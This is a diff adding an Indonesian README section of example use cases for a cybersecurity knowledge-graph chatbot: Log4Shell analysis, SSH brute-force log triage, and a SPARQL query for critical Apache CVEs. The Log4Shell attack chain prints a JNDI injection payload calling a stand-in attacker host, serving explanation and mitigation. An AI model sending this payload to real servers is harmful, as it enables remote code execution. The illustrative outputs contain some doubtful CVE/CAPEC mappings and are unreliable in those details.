@@ -355,6 +355,233 @@ SEPSES-CSKG-LLM-Chatbot/
 
 ---
 
+## Contoh Use-Case
+
+Berikut adalah 3 contoh use-case utama yang menunjukkan bagaimana sistem memproses pertanyaan pengguna melalui pipeline Hybrid RAG + GraphRAG.
+
+### Use-Case 1: Security Analysis — Analisis Kerentanan CVE
+
+**Deskripsi:** Pengguna memasukkan CVE ID spesifik untuk mendapatkan analisis keamanan komprehensif. Sistem melakukan multi-hop traversal pada Knowledge Graph (`CVE → CWE → CAPEC → ATT&CK`) dan menghasilkan laporan terstruktur.
+
+**Mode Pipeline:** `Security Analysis`
+
+<table>
+<tr><th width="100">Aspek</th><th>Detail</th></tr>
+<tr>
+<td><strong>Input</strong></td>
+<td>
+
+```
+Analisis kerentanan CVE-2021-44228 dan berikan rekomendasi mitigasi
+```
+</td>
+</tr>
+<tr>
+<td><strong>Proses</strong></td>
+<td>
+
+1. Pipeline mendeteksi CVE ID `CVE-2021-44228` dari teks pertanyaan
+2. Multi-hop traversal SPARQL ke SEPSES KG:
+   ```
+   CVE-2021-44228 → CWE-917 (Expression Language Injection)
+                   → CWE-20 (Improper Input Validation)
+                   → CAPEC-135 (Format String Injection)
+                   → ATT&CK Technique
+   ```
+3. Mengambil CVSS score, attack vector, dan affected products (CPE)
+4. LLM menyusun respons berdasarkan konteks KG
+</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td>
+
+```markdown
+## Summary
+CVE-2021-44228 (Log4Shell) adalah kerentanan critical (CVSS 10.0) pada
+Apache Log4j 2.x yang memungkinkan Remote Code Execution melalui JNDI
+injection pada log messages.
+
+## Vulnerability Details
+- **CVE ID:** CVE-2021-44228
+- **CVSS Score:** 10.0 (Critical)
+- **Attack Vector:** Network
+- **CWE:** CWE-917 — Improper Neutralization of Special Elements used
+  in an Expression Language Statement
+- **CAPEC:** CAPEC-135 — Format String Injection
+
+## Risk Assessment
+Skor CVSS 10.0 menunjukkan risiko tertinggi. Serangan dapat dilakukan
+secara remote tanpa autentikasi melalui input string yang diproses
+oleh Log4j.
+
+## Attack Chain
+1. Attacker mengirim crafted string `${jndi:ldap://attacker.com/a}`
+2. Log4j memproses string dan melakukan JNDI lookup
+3. Server korban mengunduh dan mengeksekusi malicious class
+4. Attacker mendapat Remote Code Execution pada server
+
+## Recommendations
+1. Upgrade ke Apache Log4j ≥ 2.17.1
+2. Set property `log4j2.formatMsgNoLookups=true`
+3. Blokir outbound LDAP/RMI traffic di firewall
+4. Scan semua aplikasi untuk dependensi Log4j vulnerable
+
+## KG Sources
+- SEPSES CVE: http://w3id.org/sepses/resource/cve/CVE-2021-44228
+- SEPSES CWE: http://w3id.org/sepses/resource/cwe/CWE-917
+- SEPSES CAPEC: http://w3id.org/sepses/resource/capec/CAPEC-135
+```
+</td>
+</tr>
+</table>
+
+---
+
+### Use-Case 2: Log Analysis — Investigasi Log Keamanan
+
+**Deskripsi:** Pengguna mengunggah file log keamanan (Snort/Syslog/Windows Event) dan mengajukan pertanyaan tentang ancaman yang terdeteksi. Sistem melakukan semantic search pada ChromaDB lalu memperkaya temuan dengan data dari Knowledge Graph.
+
+**Mode Pipeline:** `Log Analysis`
+
+<table>
+<tr><th width="100">Aspek</th><th>Detail</th></tr>
+<tr>
+<td><strong>Input</strong></td>
+<td>
+
+```
+Apakah ada indikasi serangan brute-force pada log ini? Identifikasi
+sumber dan target serangan.
+```
+
+*Catatan: log Snort/Syslog sudah diunggah sebelumnya ke ChromaDB.*
+</td>
+</tr>
+<tr>
+<td><strong>Proses</strong></td>
+<td>
+
+1. Hybrid retrieval (BM25 + Semantic + RRF fusion) dari ChromaDB mengambil top-5 log entry yang relevan dengan "brute-force"
+2. Hasil retrieval:
+   ```
+   [HIGH] Src: 192.168.1.105 → Dst: 10.0.0.5 | Failed SSH login attempt (attempt 47/50)
+   [HIGH] Src: 192.168.1.105 → Dst: 10.0.0.5 | Failed SSH login attempt (attempt 48/50)
+   [CRITICAL] Src: 192.168.1.105 → Dst: 10.0.0.5 | SSH brute-force threshold exceeded
+   [MEDIUM] Src: 192.168.1.105 → Dst: 10.0.0.8 | Port scan detected (22, 80, 443, 3389)
+   [HIGH] Src: 192.168.1.105 → Dst: 10.0.0.5 | Successful SSH login after 49 failures
+   ```
+3. Pipeline mendeteksi potensi CVE terkait (jika ada) lalu melakukan KG enrichment
+4. LLM menganalisis pola serangan dan memberikan rekomendasi
+</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td>
+
+```markdown
+## Detected Threats
+| # | Severity | Deskripsi |
+|---|----------|-----------|
+| 1 | CRITICAL | SSH brute-force attack berhasil — login sukses setelah 49 percobaan gagal |
+| 2 | MEDIUM | Port scanning dari IP yang sama terhadap multiple hosts |
+
+## Attack Stage (MITRE ATT&CK)
+- **Tactic:** Initial Access (TA0001)
+- **Technique:** T1110.001 — Brute Force: Password Guessing
+- **Sub-activity:** Port scanning menunjukkan fase Reconnaissance (TA0043)
+
+## Affected Systems
+- **Attacker IP:** 192.168.1.105
+- **Primary Target:** 10.0.0.5 (SSH service, port 22) — COMPROMISED
+- **Secondary Target:** 10.0.0.8 (port scan, belum ada indikasi compromise)
+
+## Immediate Actions
+1. **Isolasi** host 10.0.0.5 — kemungkinan sudah compromised
+2. **Block** IP 192.168.1.105 di firewall (ingress + egress)
+3. **Audit** akun SSH yang berhasil login — reset password & revoke session
+4. **Implementasi** fail2ban / account lockout policy (max 5 attempts)
+5. **Migrasi** ke SSH key-based authentication, disable password login
+```
+</td>
+</tr>
+</table>
+
+---
+
+### Use-Case 3: KG Question Answering — Query Langsung ke Knowledge Graph
+
+**Deskripsi:** Pengguna mengajukan pertanyaan dalam bahasa natural tentang data di SEPSES Knowledge Graph. Sistem mengonversi pertanyaan menjadi SPARQL query (NL2SPARQL), mengeksekusinya ke SEPSES endpoint, lalu menyajikan jawaban dalam bahasa natural.
+
+**Mode Pipeline:** `KG Question Answering`
+
+<table>
+<tr><th width="100">Aspek</th><th>Detail</th></tr>
+<tr>
+<td><strong>Input</strong></td>
+<td>
+
+```
+Cari semua CVE critical (CVSS ≥ 9.0) yang mempengaruhi produk Apache
+```
+</td>
+</tr>
+<tr>
+<td><strong>Proses</strong></td>
+<td>
+
+1. NL2SPARQL mengonversi pertanyaan menjadi SPARQL query:
+   ```sparql
+   PREFIX cve:  <http://w3id.org/sepses/vocab/ref/cve#>
+   PREFIX cpe:  <http://w3id.org/sepses/vocab/ref/cpe#>
+   PREFIX cvss: <http://w3id.org/sepses/vocab/ref/cvss#>
+   SELECT ?cveId ?score ?product WHERE {
+     ?cve cve:cveId  ?cveId ;
+          cve:hasCPE ?cpe ;
+          cve:hasCVSS ?cvssNode .
+     ?cpe cpe:productId ?product .
+     ?cvssNode cvss:baseScore ?score .
+     FILTER(CONTAINS(LCASE(STR(?product)), "apache"))
+     FILTER(?score >= 9.0)
+   } ORDER BY DESC(?score) LIMIT 20
+   ```
+2. Query dieksekusi ke endpoint `https://w3id.org/sepses/sparql`
+3. Hasil (max 20 rows) diformat dan dikirim ke LLM sebagai konteks
+4. LLM menyusun jawaban berbasis data KG
+</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td>
+
+```markdown
+Berdasarkan data dari SEPSES Cybersecurity Knowledge Graph, berikut
+adalah CVE critical (CVSS ≥ 9.0) yang mempengaruhi produk Apache:
+
+| # | CVE ID | CVSS Score | Affected Product |
+|---|--------|:----------:|------------------|
+| 1 | CVE-2021-44228 | 10.0 | apache:log4j |
+| 2 | CVE-2021-41773 | 9.8  | apache:http_server |
+| 3 | CVE-2023-25690 | 9.8  | apache:http_server |
+| 4 | CVE-2022-22965 | 9.8  | apache:tomcat |
+| 5 | CVE-2023-46604 | 9.8  | apache:activemq |
+| ... | ... | ... | ... |
+
+**Temuan Utama:**
+- Total **15 CVE critical** ditemukan pada produk Apache
+- Produk paling banyak terdampak: **Apache HTTP Server** (6 CVE)
+- CVE dengan skor tertinggi: **CVE-2021-44228** (Log4Shell, CVSS 10.0)
+
+**SPARQL Query Used:**
+Query telah dieksekusi melalui NL2SPARQL conversion terhadap
+endpoint SEPSES (https://w3id.org/sepses/sparql)
+```
+</td>
+</tr>
+</table>
+
+---
+
 ## Mengapa OpenRouter?
 
 Proyek ini menggunakan **OpenRouter** sebagai unified API gateway untuk akses ke 100+ model LLM dari berbagai provider. Keuntungan:
